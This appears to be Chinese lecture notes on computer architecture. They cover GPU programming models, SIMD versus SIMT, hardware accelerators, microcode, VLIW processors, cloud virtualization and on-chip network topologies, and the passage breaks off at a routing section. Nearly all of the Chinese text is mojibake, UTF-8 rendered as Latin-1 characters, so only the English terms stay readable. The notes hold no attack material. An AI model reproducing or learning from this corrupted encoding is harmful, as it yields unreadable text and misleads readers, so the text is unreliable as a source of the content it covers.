GPUçš„åŸºæœ¬ç¡¬ä»¶ç»“æ„ CPU+GPUå¼‚æ„ä½“ç³»ç»“æ„\næ¨åŠ¨å¼‚æ„è®¡ç®—çš„å‘å±•\né’ˆå¯¹æ¯ä¸ªä»»åŠ¡é€‰æ‹©åˆé€‚çš„å¤„ç†å™¨å’Œå­˜å‚¨å™¨\nGPUå¼±æ§åˆ¶å¼ºè®¡ç®—ï¼ŒCPUå¼ºæ§åˆ¶å¼±è®¡ç®—\né€šç”¨CPU é€‚åˆæ‰§è¡Œä¸€äº›ä¸²è¡Œçš„çº¿ç¨‹\nGPUé€‚åˆæ‰§è¡Œå¤§é‡å¹¶è¡Œçº¿ç¨‹\nå¯æ‰©å±•çš„å¹¶è¡Œæ‰§è¡Œ é«˜å¸¦å®½çš„å¹¶è¡Œå­˜å– GPUç¼–ç¨‹æ¨¡å‹ GPUåŸºäºSIMDå¼•æ“\næŒ‡ä»¤æµæ°´çº¿ç±»ä¼¼äºSIMDçš„æµæ°´çº¿\nä¸æ˜¯ç”¨SIMDæŒ‡ä»¤ç¼–ç¨‹ åŸºäºä¸€èˆ¬çš„æŒ‡ä»¤ï¼Œåº”ç”¨ç”±ä¸€ç»„çº¿ç¨‹æ„æˆ ç¼–ç¨‹æ¨¡å‹ï¼šæŒ‡ç¨‹åºå‘˜å¦‚ä½•æè¿°åº”ç”¨ï¼ˆä»ç¨‹åºå‘˜è§’åº¦çœ‹åˆ°çš„æœºå™¨æ¨¡å‹ï¼‰\nä¾‹å¦‚, é¡ºåºæ¨¡å‹ (von Neumann), æ•°æ®å¹¶è¡Œ(SIMD), æ•°æ®æµæ¨¡å‹ã€å¤šçº¿ç¨‹æ¨¡å‹(MIMD, SPMD) ä¸‰ç§ç¼–ç¨‹æ¨¡å¼æ¥æŒ–æ˜ç¨‹åºçš„å¹¶è¡Œæ€§:\nSequential (SISD) Data-Parallel (SIMD) Multithreaded (MIMD/SPMD) ç¼–ç¨‹æ¨¡å‹1: Sequential SISD\nå¯ä»¥é‡‡ç”¨å¤šç§ç±»å‹å¤„ç†å™¨æ‰§è¡Œ Pipelined processor Out-of-order execution processor å°±ç»ªçš„ç›¸äº’æ— å…³æŒ‡ä»¤ï¼› ä¸åŒå¾ªç¯çš„æŒ‡ä»¤ç¼“å­˜åœ¨æŒ‡ä»¤çª—å£ä¸­ï¼Œå¤šä¸ªåŠŸèƒ½éƒ¨ä»¶å¯ä»¥å¹¶è¡Œæ‰§è¡Œï¼› é€šè¿‡ç¡¬ä»¶å®ç°å¾ªç¯å±•å¼€ Superscalar or VLIW processor æ¯ä¸ªå‘¨æœŸå¯ä»¥å­˜å–å’Œè¯»å–å¤šæ¡æŒ‡ä»¤ ç¼–ç¨‹æ¨¡å‹2: Data Parallelï¼ˆSIMDï¼‰\nRealization: å„å¾ªç¯ä¹‹é—´ç›¸äº’ç‹¬ç«‹çš„ï¼Œæ²¡æœ‰æ•°æ®ä¾èµ–\nIdea:ç¨‹åºå‘˜æˆ–ç¼–è¯‘å™¨ç”ŸæˆSIMDæŒ‡ä»¤ï¼Œæ‰€æœ‰çš„å¾ªç¯æ‰§è¡Œç›¸åŒ\nçš„æŒ‡ä»¤ï¼Œå¤„ç†ä¸åŒçš„æ•°æ®\nç¼–ç¨‹æ¨¡å‹3:å¤šçº¿ç¨‹\nRealization:å„å¾ªç¯ä¹‹é—´ç›¸äº’ç‹¬ç«‹çš„ï¼Œæ²¡æœ‰æ•°æ®ä¾èµ–\nIdea: ç¨‹åºå‘˜æˆ–ç¼–è¯‘å™¨ä¸ºæ¯æ¬¡å¾ªç¯ç”Ÿæˆä¸€ä¸ªçº¿ç¨‹ã€‚æ¯ä¸ªçº¿ç¨‹æ‰§è¡ŒåŒæ ·çš„æŒ‡ä»¤æµï¼ˆä»£ç è·¯å¾„ï¼‰ï¼Œå¤„ç†ä¸åŒçš„æ•°æ®\nSPMD\nSingle procedure/program, multiple data\nå®ƒæ˜¯ä¸€ç§ç¼–ç¨‹æ¨¡å‹è€Œä¸æ˜¯è®¡ç®—æœºç»„ç»‡ æ¯ä¸ªå¤„ç†å•å…ƒæ‰§è¡ŒåŒæ ·çš„è¿‡ç¨‹ï¼Œå¤„ç†ä¸åŒçš„æ•°æ®\nè¿™äº›è¿‡ç¨‹å¯ä»¥åœ¨ç¨‹åºä¸­çš„æŸä¸ªç‚¹ä¸ŠåŒæ­¥ï¼Œä¾‹å¦‚ barriers å¤šæ¡æŒ‡ä»¤æµæ‰§è¡Œç›¸åŒçš„ç¨‹åº\næ¯ä¸ªç¨‹åº/è¿‡ç¨‹ æ“ä½œä¸åŒçš„æ•°æ® è¿è¡Œæ—¶å¯ä»¥æ‰§è¡Œä¸åŒçš„æ§åˆ¶æµè·¯å¾„ å¤šç§‘å­¦è®¡ç®—åº”ç”¨ä»¥è¿™ç§æ–¹å¼ç¼–ç¨‹ï¼Œè¿è¡Œåœ¨MIMDç¡¬ä»¶ç»“æ„ä¸Š (multiprocessors) ç°ä»£é€šç”¨ GPUs ä»¥è¿™ç§ç±»ä¼¼çš„æ–¹å¼ç¼–ç¨‹ï¼Œè¿è¡Œåœ¨SIMDç¡¬ä»¶ä¸Š GPUç¼–ç¨‹è¯­è¨€\nCUDA ï¼ˆNvidiaç ”åˆ¶çš„ä¸“ç”¨æ¨¡å‹ï¼‰\nOpenCL ï¼ˆå¼€æ”¾æ ‡å‡†ï¼‰\nSIMD vs. SIMT Execution Model\nSIMD: ä¸€æ¡æŒ‡ä»¤æµï¼ˆä¸€ä¸²é¡ºåºçš„SIMDæŒ‡ä»¤ï¼‰ï¼Œæ¯æ¡æŒ‡ä»¤å¯¹åº”å¤šä¸ªæ•°æ®è¾“å…¥ï¼ˆå‘é‡æŒ‡ä»¤ï¼‰ SIMT: å¤šä¸ªæŒ‡ä»¤æµï¼ˆæ ‡é‡æŒ‡ä»¤ï¼‰æ„æˆçº¿ç¨‹ï¼Œ è¿™äº›çº¿ç¨‹åŠ¨æ€æ„æˆwarpã€‚ä¸€ä¸ªWarpå¤„ç†å¤šä¸ªæ•°æ®å…ƒç´  ä¸ƒã€ç¡¬ä»¶åŠ é€Ÿå™¨ åŠ é€Ÿå™¨æ¦‚è¿° åŠ é€Ÿå™¨æ˜¯é¢å‘ç‰¹å®šé¢†åŸŸã€é’ˆå¯¹æœ‰é™ç®—æ³•å®šåˆ¶è®¾è®¡çš„ä¸“ç”¨è®¡ç®—æ¶æ„ï¼Œå…¶ç›®çš„æ˜¯æå‡ç‰¹å®šè®¡ç®—çš„æ€§èƒ½æˆ–å‡å°‘åŠŸè€—éœ€æ±‚\nä¸»è¦ä½œç”¨å¦‚ä¸‹ï¼š\næé«˜æ€§èƒ½ï¼š ç¡¬ä»¶åŠ é€Ÿå™¨èƒ½å¤Ÿæ‰§è¡Œç‰¹å®šç±»å‹çš„è®¡ç®—ä»»åŠ¡æ¯”é€šç”¨å¤„ç†å™¨æ›´é«˜æ•ˆã€‚é€šè¿‡å°†ç‰¹å®šå·¥ä½œè´Ÿè½½åˆ†é…ç»™ç¡¬ä»¶åŠ é€Ÿå™¨ï¼Œå¯ä»¥æ˜¾è‘—æé«˜è®¡ç®—æ€§èƒ½ï¼Œç¼©çŸ­ä»»åŠ¡æ‰§è¡Œæ—¶é—´ã€‚ é™ä½èƒ½è€—ï¼š ç›¸å¯¹äºé€šç”¨å¤„ç†å™¨ï¼Œç¡¬ä»¶åŠ é€Ÿå™¨é€šå¸¸ä¸“é—¨ä¼˜åŒ–äº†æŸäº›è®¡ç®—ä»»åŠ¡ï¼Œå› æ­¤åœ¨æ‰§è¡Œè¿™äº›ä»»åŠ¡æ—¶èƒ½å¤Ÿæ›´æœ‰æ•ˆåœ°åˆ©ç”¨èƒ½æºï¼Œé™ä½æ•´ä½“ç³»ç»Ÿçš„èƒ½è€—ã€‚ åŠ é€Ÿç‰¹å®šåº”ç”¨ï¼š ç¡¬ä»¶åŠ é€Ÿå™¨é€šå¸¸è®¾è®¡ç”¨äºå¤„ç†ç‰¹å®šç±»å‹çš„åº”ç”¨æˆ–å·¥ä½œè´Ÿè½½ï¼Œå¦‚å›¾å½¢å¤„ç†å•å…ƒ (GPU) ç”¨äºå›¾å½¢æ¸²æŸ“ã€å¼ é‡å¤„ç†å•å…ƒ (TPU) ç”¨äºæ·±åº¦å­¦ä¹ ä»»åŠ¡ç­‰ã€‚è¿™ä½¿å¾—ç¡¬ä»¶åŠ é€Ÿå™¨èƒ½å¤Ÿåœ¨ç‰¹å®šé¢†åŸŸå†…å–å¾—æ›´å¥½çš„æ€§èƒ½ã€‚ å¹¶è¡Œè®¡ç®—ï¼š è®¸å¤šç¡¬ä»¶åŠ é€Ÿå™¨æ˜¯ä¸ºå¹¶è¡Œè®¡ç®—è€Œè®¾è®¡çš„ï¼Œèƒ½å¤ŸåŒæ—¶å¤„ç†å¤šä¸ªæ•°æ®ç‚¹æˆ–ä»»åŠ¡ã€‚è¿™ç§å¹¶è¡Œæ€§èƒ½æœ‰åŠ©äºåŠ é€Ÿå¤§è§„æ¨¡æ•°æ®å¤„ç†å’Œå¤æ‚è®¡ç®—ä»»åŠ¡ã€‚ æ”¯æŒæ–°æŠ€æœ¯ï¼š ç¡¬ä»¶åŠ é€Ÿå™¨é€šå¸¸ä¸æ–°å…´æŠ€æœ¯å’Œæ ‡å‡†ä¸€èµ·æ¨å‡ºï¼Œä»¥æ”¯æŒç‰¹å®šåº”ç”¨çš„å‘å±•ã€‚ä¾‹å¦‚ï¼Œä¸“é—¨ç”¨äºæœºå™¨å­¦ä¹ çš„åŠ é€Ÿå™¨å¯èƒ½æ”¯æŒæ–°çš„æ·±åº¦å­¦ä¹ æ¡†æ¶å’Œç®—æ³•ã€‚ è§£æ”¾CPUèµ„æºï¼š é€šè¿‡å°†ç‰¹å®šå·¥ä½œè´Ÿè½½è½¬ç§»åˆ°ç¡¬ä»¶åŠ é€Ÿå™¨ï¼Œå¯ä»¥é‡Šæ”¾ä¸»å¤„ç†å™¨ï¼ˆé€šå¸¸æ˜¯CPUï¼‰çš„è®¡ç®—èµ„æºï¼Œä½¿å…¶èƒ½å¤Ÿæ›´ä¸“æ³¨äºæ‰§è¡Œå…¶ä»–ä»»åŠ¡ã€‚ æ€»ä½“è€Œè¨€ï¼Œç¡¬ä»¶åŠ é€Ÿå™¨çš„ä¸»è¦ä½œç”¨æ˜¯é€šè¿‡ä¸“é—¨ä¼˜åŒ–å’Œå¹¶è¡Œè®¡ç®—ï¼Œæé«˜ç‰¹å®šå·¥ä½œè´Ÿè½½çš„æ‰§è¡Œæ•ˆç‡å’Œæ€§èƒ½ï¼Œä»è€Œåœ¨å„ç§é¢†åŸŸä¸­å–å¾—æ›´å¥½çš„è®¡ç®—ç»“æœ\nåŠ é€Ÿå™¨çš„è®¾è®¡å’Œå®ç°ä¸»è¦æœ‰ä¸¤ç±»ï¼š\nè®¾è®¡ä¸“ç”¨é›†æˆç”µè·¯ï¼ˆASICï¼‰\nASIC æ˜¯æœ€é«˜æ•ˆçš„ åŸºäºå¯é‡æ„å™¨ä»¶å¼€å‘ï¼ˆå¦‚FPGAï¼‰\nè®¾è®¡çµæ´»ï¼Œå¼€å‘å‘¨æœŸæ›´çŸ­ Xilinxå’ŒAltera æ·±åº¦å­¦ä¹ åŠ é€Ÿå™¨ å·ç§¯ç¥ç»ç½‘ç»œ å·ç§¯è®¡ç®— éçº¿æ€§æ¿€æ´»å±‚ æ± åŒ–å±‚ æ± åŒ–å±‚ä½œç”¨ï¼šå‡å°‘æ•°æ®é‡ï¼Œå¸¸è§çš„æœ‰Average Poolingå’ŒMax Pooling ç¨€ç–å¼ é‡ï¼ˆSparse Tensorï¼‰ å›¾è®¡ç®—åŠ é€Ÿå™¨ å…«ã€å¾®ç å’Œè¶…é•¿æŒ‡ä»¤å­— å¾®ç å¤„ç†å™¨ ç›®å‰çš„å¤„ç†å™¨å¤§å¤šéƒ½æ˜¯ç¡¬å¸ƒçº¿è®¾è®¡ï¼ˆHardwiredï¼‰ï¼šé€šè¿‡å¾®ä½“ç³»ç»“æ„ç›´æ¥å®ç°ISAä¸­çš„æ‰€æœ‰æŒ‡ä»¤\nå¾®ç å¤„ç†å™¨å¢åŠ äº†ä¸€ä¸ªè§£é‡Šå±‚ï¼šæ¯æ¡ISAæŒ‡ä»¤éƒ½é‡‡ç”¨ä¸€ç³»åˆ—æ›´ç®€å•çš„å¾®æŒ‡ä»¤è¡¨è¾¾ï¼ˆè¢«è§£é‡Šä¸ºä¸€ç³»åˆ—å¾®æŒ‡ä»¤çš„åºåˆ—ï¼‰\néƒ¨ç½²å®æ–½æ›´ç®€å•ï¼ŒæŒ‡ä»¤æ‰§è¡Œçµæ´»ã€å¯æ§\nMicrocontrol Unit\nå¤„ç†å™¨è®¾è®¡å¯ä»¥åˆ†ä¸ºdatapathå’ŒControlè®¾è®¡ä¸¤éƒ¨åˆ†\ndatapath, å­˜å‚¨æ•°æ®ã€ç®—æœ¯é€»è¾‘è¿ç®—å•å…ƒ control, æ§åˆ¶æ•°æ®é€šè·¯ä¸Šçš„ä¸€ç³»åˆ—æ“ä½œ å¾®æŒ‡ä»¤\nnext ï¼šincrements ÂµPC\nspin ï¼šwaits for memory\nfetch ï¼šjumps to start of instruction fetch\ndispatch ï¼šjumps to start of decoded opcode group\nftrue/ffalse *ï¼š*jumps to fetch if Cond? true/false\nç°ä»£å¾®å¤„ç†å™¨ä¸­å¾®ç¨‹åºæ§åˆ¶æ‰®æ¼”è¾…åŠ©çš„è§’è‰²\ne.g., AMD Bulldozer, Intel Ivy Bridge, Intel Atom, IBM PowerPC, â€¦ å¤§å¤šæ•°æŒ‡ä»¤é‡‡ç”¨ç¡¬å¸ƒçº¿é€»è¾‘æ§åˆ¶ ä¸å¸¸ç”¨çš„æŒ‡ä»¤æˆ–è€…å¤æ‚çš„æŒ‡ä»¤é‡‡ç”¨å¾®ç¨‹åºæ§åˆ¶ èŠ¯ç‰‡bugçš„æ¼æ´ä¿®å¤ï¼ˆåŸºäºå¾®ç çš„ä¿®å¤å’Œå‡çº§ï¼‰\nIntelå¤„ç†å™¨åœ¨ bootupé˜¶æ®µå¯è£…è½½å¾®ä»£ç æ–¹å¼çš„patches è‹±ç‰¹å°”ä¸å¾—ä¸é‡æ–°å¯ç”¨å¾®ä»£ç å·¥å…·ï¼Œå¹¶å¯»æ‰¾åŸæ¥çš„å¾®ç å·¥ç¨‹å¸ˆæ¥ä¿®è¡¥ç†”æ–­/å¹½çµå®‰å…¨æ¼æ´ è¶…é•¿æŒ‡ä»¤å­—VLIWå¤„ç†å™¨ æé«˜æŒ‡ä»¤çº§å¹¶è¡Œï¼ˆILPï¼‰çš„æœ‰æ•ˆæ–¹æ³•\næµæ°´çº¿ï¼Œå¤šå¤„ç†å™¨ï¼Œè¶…æ ‡é‡å¤„ç†å™¨ï¼Œè¶…é•¿æŒ‡ä»¤å­—VLIW å®šä¹‰ï¼šVLIWæŒ‡çš„æ˜¯ä¸€ç§è¢«è®¾è®¡ä¸ºå¯ä»¥åˆ©ç”¨æŒ‡ä»¤çº§å¹¶è¡Œï¼ˆILPï¼‰ä¼˜åŠ¿çš„CPUä½“ç³»ç»“æ„ï¼Œç”±äºåœ¨ä¸€æ¡æŒ‡ä»¤ä¸­å°è£…äº†å¤šä¸ªå¹¶è¡Œæ“ä½œï¼Œå…¶æŒ‡ä»¤çš„é•¿åº¦æ¯”RISCæˆ–CISCçš„æŒ‡ä»¤è¦é•¿ï¼Œå› æ­¤èµ·åä¸ºè¶…é•¿æŒ‡ä»¤é›†\nä¸è¶…æ ‡é‡å¤„ç†å™¨çš„æ¯”è¾ƒ\nç›¸åŒï¼šä¸€æ¬¡å‘å°„å¹¶å®Œæˆå¤šä¸ªæ“ä½œï¼Œæé«˜ILP ä¸åŒï¼š è¶…æ ‡é‡ï¼šè¦å¤æ‚é€»è¾‘å‘ç°æŒ‡ä»¤ä¹‹é—´çš„æ•°æ®ä¾èµ–å…³ç³»ï¼Œä»¥åŠä¹±åºæ‰§è¡Œé€»è¾‘å’Œè¶…æ ‡é‡æ¶æ„æ¥å®ç°å¤šæŒ‡ä»¤çš„å¹¶è¡Œå‘å°„ VLIWï¼šé€šè¿‡ç¼–è¯‘å™¨å¯¹å¹¶å‘æ“ä½œè¿›è¡Œäº†ç¼–ç ï¼Œè¿™ç§æ˜¾å¼ç¼–ç æå¤§åœ°é™ä½äº†ç¡¬ä»¶çš„å¤æ‚æ€§ VLIW: Very Long Instruction Word\nå®šé•¿æŒ‡ä»¤ï¼Œå°†å¤šä¸ªç›¸äº’æ— ä¾èµ–å…³ç³»çš„æŒ‡ä»¤å°è£…åˆ°ä¸€æ¡è¶…é•¿çš„æŒ‡ä»¤å­—ä¸­ æ¯ä¸ªæ“ä½œæ§½ï¼ˆslotï¼‰å‡ç”¨äºå›ºå®šçš„åŠŸèƒ½ æ¯ä¸ªåŠŸèƒ½å•å…ƒçš„operationéƒ½å£°æ˜äº†å›ºå®šçš„å»¶è¿Ÿ VLIWå¤„ç†å™¨è®¾è®¡åŸåˆ™\næ¶æ„è®¾è®¡\nå…è®¸ä¸€ä¸ªæŒ‡ä»¤å†…å¤šä¸ªOperationsçš„å¹¶è¡Œæ‰§è¡Œ å¤„ç†å™¨ä¸­éœ€è¦æœ‰å¯¹åº”æ•°é‡çš„ALUå•å…ƒå®Œæˆç›¸åº”çš„Operations ä¸ºæ‰€æœ‰Operationæä¾›ç¡®å®šæ€§å»¶è¿Ÿ åœ¨æŒ‡å®šçš„å»¶è¿Ÿä¹‹å‰ä¸å…è®¸ä½¿ç”¨æ•°æ®ï¼Œæ— éœ€æ•°æ®äº’é” ç¼–è¯‘å™¨\nè¿›è¡Œä¾èµ–æ€§çš„æ£€æŸ¥ï¼Œä¿è¯æŒ‡ä»¤å†…å„Operationsçš„å¹¶è¡Œæ€§ é€šè¿‡ç¼–è¯‘å™¨çš„è°ƒåº¦ï¼ˆé‡æ–°æ’åºï¼‰Operationsï¼Œä»¥æœ€å¤§é™åº¦çš„æé«˜å¹¶è¡Œæ€§ é€šè¿‡ç¼–è¯‘å™¨è°ƒåº¦ä»¥é¿å…æ•°æ®ç«äº‰ï¼ˆæ— interlocksï¼‰ ç¼–è¯‘å™¨éœ€è¦æ‰¾åˆ°Nä¸ªç‹¬ç«‹çš„Operationsï¼Œä¸è¶³åˆ™æ’å…¥NOP VLIW Loop\nVLIW Loop Unrolling\nSoftware Pipeling\nç»å…¸VLIWçš„é—®é¢˜\nå¯¹äºåˆ†æ”¯æ¦‚ç‡çš„äº†è§£ ä»£ç åˆ†æéœ€è¦åœ¨æ„å»ºè¿‡ç¨‹ä¸­æ‰§è¡Œé¢å¤–çš„æ­¥éª¤ å¯¹é™æ€ä¸å¯é¢„æµ‹çš„åˆ†æ”¯è¿›è¡Œè°ƒåº¦ æœ€ä½³è°ƒåº¦æ–¹å¼ä¼šå› åˆ†æ”¯è·¯å¾„è€Œä¸åŒï¼Œå¢åŠ ç¼–è¯‘æ—¶é—´ å¢åŠ äº†ç›®æ ‡ä»£ç é‡ æŒ‡ä»¤å¡«å……æµªè´¹æŒ‡ä»¤å†…å­˜/ç¼“å­˜ï¼ˆæ— æ³•æ‰¾åˆ°å½¼æ­¤ç‹¬ç«‹çš„Operationsï¼‰ å¾ªç¯å±•å¼€/è½¯ä»¶æµæ°´çº¿è¿™äº›æŠ€æœ¯éœ€è¦å¤åˆ¶å¤§é‡ä»£ç  è°ƒåº¦å†…å­˜æ“ä½œ ç¼“å­˜å’Œ/æˆ–å†…å­˜è®¿é—®æœ‰æ—¶å€™ä¼šå¸¦æ¥é™æ€ä¸å¯é¢„æµ‹çš„memory Operation ç›®æ ‡ä»£ç å…¼å®¹æ€§ å¿…é¡»ä¸ºæ¯å°æœºå™¨é‡æ–°ç¼–è¯‘æ‰€æœ‰ä»£ç  ä¹ã€äº‘è®¡ç®—æ¦‚è¿°å’Œè™šæ‹ŸåŒ– Why run applications on cloud and not on â€œbare metalâ€ servers?\n**èµ„æºå…±äº«ï¼š**é€šè¿‡è™šæ‹ŸåŒ–ï¼Œå¤šä¸ªè™šæ‹Ÿæœºå¯ä»¥å…±äº«ç³»ç»Ÿèµ„æºï¼Œæé«˜èµ„æºçš„åˆ©ç”¨ç‡ é™ä½ç»´æŠ¤æˆæœ¬ï¼š ç”±äº‘æœåŠ¡æä¾›å•†è´Ÿè´£ç¡¬ä»¶å’Œè½¯ä»¶çš„ç»´æŠ¤ï¼Œé™ä½äº†ç”¨æˆ·çš„è¿ç»´è´Ÿæ‹…\nçµæ´»æ€§ï¼š è™šæ‹Ÿæœºå¯ä»¥åœ¨éœ€è¦æ—¶è¿ç§»åˆ°å¦ä¸€å°æœºå™¨ï¼Œå¢åŠ äº†ç³»ç»Ÿçš„å¼¹æ€§\næŒ‰éœ€ä»˜è´¹ï¼š å¦‚æœä½¿ç”¨è¾ƒè½»ï¼Œæ— éœ€æŠ•èµ„è´­ä¹°æœåŠ¡å™¨ï¼ŒæŒ‰ä½¿ç”¨é‡ä»˜è´¹ï¼ŒèŠ‚çœæˆæœ¬\nDisadvantages of running applications on cloud\næ€§èƒ½ï¼š é€šè¿‡äº’è”ç½‘è®¿é—®æœåŠ¡å™¨å¯èƒ½å¯¼è‡´è¾ƒé•¿çš„å»¶è¿Ÿï¼Œé™ä½äº†æ€§èƒ½\næˆæœ¬ï¼š åœ¨é«˜åº¦ä½¿ç”¨çš„æƒ…å†µä¸‹ï¼Œäº‘è®¡ç®—å¯èƒ½æˆæœ¬è¾ƒé«˜ï¼Œå°¤å…¶æ˜¯å¤§è§„æ¨¡çš„åº”ç”¨\nHypervisorçš„åˆ†ç±»\nåã€ç‰‡ä¸Šäº’è”ç½‘ç»œ ç³»ç»Ÿè®¾è®¡ä¸­çš„é‡ç‚¹é—®é¢˜\næ‹“æ‰‘Topology ç½‘ç»œä¸­ç»“ç‚¹å’Œé€šé“ä¹‹é—´çš„ç‰©ç†å¸ƒå±€å’Œè¿æ¥ ä¼šå½±å“è·¯ç”±æ•ˆç‡ã€å¯é æ€§ã€ååé‡ã€å»¶è¿Ÿã€ç³»ç»Ÿæ„å»ºéš¾åº¦ è·¯ç”±Router ç»™å®šæ‹“æ‰‘ç»“æ„ï¼Œå†³å®šä»æºèŠ‚ç‚¹åˆ°ç›®çš„èŠ‚ç‚¹çš„è·¯å¾„ï¼Œç›´æ¥å½±å“ç½‘ç»œçš„ååé‡å’Œæ€§èƒ½ é™æ€æˆ–åŠ¨æ€ æµé‡æ§åˆ¶ Buffering and Flow Control ä¿¡å·é€šè¿‡ç½‘ç»œæ—¶å¦‚ä½•åˆ†é…èµ„æºï¼Œå¦‚ç¼“å†²å’Œé€šé“å¸¦å®½ åœ¨ç½‘ç»œæ€æ ·å­˜å‚¨æ•°æ® æ‹¥å¡æ§åˆ¶ äº’è”ç³»ç»Ÿçš„è¯„æµ‹æŒ‡æ ‡\nå…³é”®æŒ‡æ ‡ æˆæœ¬ Cost å»¶è¿Ÿ Latency é‡è¦æŒ‡æ ‡ èƒ½è€— Energy å¸¦å®½ Bandwidth ç½‘ç»œç«äº‰ Contention æ•´ä½“ç³»ç»Ÿæ€§èƒ½ Overall System Performance æ‹“æ‰‘ç»“æ„ æ€»çº¿ Busï¼ˆSimplestï¼‰\nç‚¹å¯¹ç‚¹ Point-to-point connection (Ideal and most costly)\näº¤å‰å¼€å…³ Crossbar (Less costly)\nç¯ Ring\næ ‘ Tree\nç½‘æ ¼ Mesh\nç¯é¢ Torus\nè¶…ç«‹æ–¹ Hypercube\næ¬§ç±³ä¼½ç½‘ç»œ Omega\næ‹“æ‰‘ç»“æ„çš„åŸºæœ¬æ¦‚å¿µ\nè·¯å¾„å¤šæ ·æ€§ Path Diversity åœ¨ç»™å®šæºèŠ‚ç‚¹å’Œç›®çš„èŠ‚ç‚¹çš„å‰æä¸‹ï¼Œå¦‚æœè¿™ä¸ªèŠ‚ç‚¹å¯¹åœ¨æŸä¸ªæ‹“æ‰‘ä¸­æ‹¥æœ‰å¤šæ¡æœ€çŸ­è·¯å¾„ï¼Œè€Œåœ¨å¦ä¸€ä¸ªæ‹“æ‰‘ä¸­åªæœ‰ä¸€æ¡æœ€çŸ­è·¯å¾„ï¼Œåˆ™è®¤ä¸ºå‰è€…çš„æ‹“æ‰‘å…·æœ‰æ›´å¤§çš„è·¯å¾„å¤šæ ·æ€§ã€‚æ‹“æ‰‘ä¸­çš„è·¯å¾„å¤šæ ·æ€§ä½¿è·¯ç”±ç®—æ³•åœ¨å¤„ç†è´Ÿè½½å‡è¡¡é—®é¢˜æ—¶å…·æœ‰æ›´å¤§çš„çµæ´»æ€§ï¼Œä»è€Œé€šè¿‡å‡å°é€šé“è´Ÿè½½ï¼Œæé«˜äº†ç½‘ç»œååé‡ã€‚è·¯å¾„å¤šæ ·æ€§è¿˜ä½¿å¾—æ•°æ®åŒ…èƒ½å¤Ÿæ‹¥æœ‰ç»•è¿‡ç½‘ç»œä¸­æ•…éšœçš„æ½œåŠ›ã€‚å½±å“æ€§èƒ½çš„å› ç´ \nå¯¹åˆ†å¸¦å®½ï¼ˆBisection Bandwidthï¼‰ å°†ç½‘ç»œåˆ’åˆ†ä¸ºä¸¤ä¸ªç›¸åŒéƒ¨åˆ†åï¼Œä¸¤éƒ¨åˆ†ä¹‹é—´çš„é€šä¿¡å¸¦å®½\nç›´è¿ç½‘ç»œå’Œé—´æ¥ç½‘ç»œ æ¯”å¦‚meshï¼Œæ‰€æœ‰èŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ªendpointå’Œä¸€ä¸ªswitch é˜»å¡å‹å’Œéé˜»å¡å‹ æ€»çº¿Bus\næ‰€æœ‰èŠ‚ç‚¹éƒ½è¿åœ¨ä¸€ä¸ªè¿æ¥ä¸Š\nç®€å•ï¼ŒSimple å°è§„æ¨¡ä¸‹ä½æˆæœ¬ï¼ŒCost effective for a small number of nodes ä¸€è‡´æ€§ä¿æŒæˆæœ¬ä½ï¼ŒEasy to implement coherence (snooping and serialization) æ‰©å±•æ€§å·®ï¼ŒNot scalable to large number of nodes (limited bandwidth) ç½‘ç»œç«äº‰é«˜ï¼ŒHigh contention -\u0026gt; fast saturation ç‚¹å¯¹ç‚¹ç½‘ç»œPoint-to-Point\næ‰€æœ‰èŠ‚ç‚¹ä¸å…¶ä»–èŠ‚ç‚¹ç›´æ¥è¿æ¥\nä½ç«äº‰ Lowest contention\nä½å»¶è¿Ÿ Potentially lowest latency\néå¸¸ç†æƒ³ï¼ŒIdeal\næœ€é«˜çš„æˆæœ¬ï¼ŒHighest cost\nConnections/nodeï¼šO(N) inksï¼šO(N2) æ‰©å±•æ€§å·® Not scalable\nå¸ƒçº¿éš¾åº¦å¤§ How to lay out on chip?\näº¤å‰å¼€å…³Crossbar\næ¯ä¸ªèŠ‚ç‚¹å‡é€šè¿‡å…±äº«é“¾è·¯ç›¸è¿ï¼ŒEvery node connected to every other with a shared link for each destination\nä¸åŒç›®çš„åœ°ä¹‹é—´å¯å¹¶è¡Œä¼ è¾“ï¼ŒEnables concurrent transfers to non-conflicting destinations\nå°è§„æ¨¡ä½æˆæœ¬ï¼ŒCould be cost-effective for small number of nodes\nä½å»¶è¿Ÿé«˜åå Low latency and high througput é«˜æˆæœ¬ Expensive æ‰©å±•æ€§å·® Not scalable -\u0026gt;O(N^2) cost å¤§è§„æ¨¡ä»²è£å›°éš¾ Difficult to arbitrate as N increases æ¯”å¦‚IBM POWER5ã€Sun Niagara I/II ç¯Ring\nç®€å•\nä¾¿å®œ O(N) cost\né«˜å»¶è¿Ÿï¼šO(N)\nå¯¹åˆ†å¸¦å®½åœ¨æ·»åŠ èŠ‚ç‚¹æ—¶ä¿æŒä¸å˜ ï¼ˆæ‰©å±•æ€§é—®é¢˜ï¼‰\næ¯”å¦‚Core i7\nå•å‘Ringï¼šUnidirectional Ring\nåŒå‘Ringï¼šBidirectional Rings\nå±‚æ¬¡Ringï¼šHierarchical Rings\nç½‘æ ¼Mesh\nç›´è¿ç½‘ç»œ\nåœ¨åŸºäºç½‘æ ¼çš„åº”ç”¨ä¸­æœ‰å±€éƒ¨æ€§\nO(N) cost\nå¹³å‡å»¶è¿Ÿ O(sqrt(N))\næ˜“äºå¸ƒçº¿\nå…·æœ‰è·¯å¾„å¤šæ ·æ€§\næ¯”å¦‚ï¼šTiera processorï¼Œprototype Intel chips\nåœ†ç¯é¢ Torus\nMesh is not symmetric on edges: performance very sensitive to placement of task on edge vs. middle Torus avoids this problem Higher path diversity (and bisection bandwidth) than mesh Higher cost Harder to lay out on-chip Unequal link lengths æ ‘ Trees\nå¹³é¢ã€åˆ†å±‚çš„æ‹“æ‰‘ç»“æ„\nå»¶è¿Ÿ O(logN)\nåˆ©äºå±€éƒ¨é€šä¿¡\nä¾¿å®œï¼šO(N) cost\næ˜“äºå¸ƒçº¿\næ ¹èŠ‚ç‚¹å°†æˆä¸ºç“¶é¢ˆï¼Œä½†Fat Treeèƒ½è§£å†³è¿™ä¸ªé—®é¢˜\nè¶…ç«‹æ–¹ Hypercube\nâ€œN-dimensional cubeâ€ or â€œN-cubeâ€ Latency: O(logN) links: O(NlogN) Low latency Hard to lay out in 2D/3D å¤šçº§ç½‘ç»œMultistage Networks\nIndirect networks with multiple layers of switches between terminals/nodes\næˆæœ¬: O(NlogN)ï¼Œ å»¶è¿Ÿï¼šO(logN) Many variations (Omega, Butterfly, Benes, Banyan, â€¦) è·¯ç”±Routing è·¯ç”±ç®—æ³•ï¼ˆä¸‰ç§ç±»å‹ï¼‰\nç¡®å®šæ€§è·¯ç”± 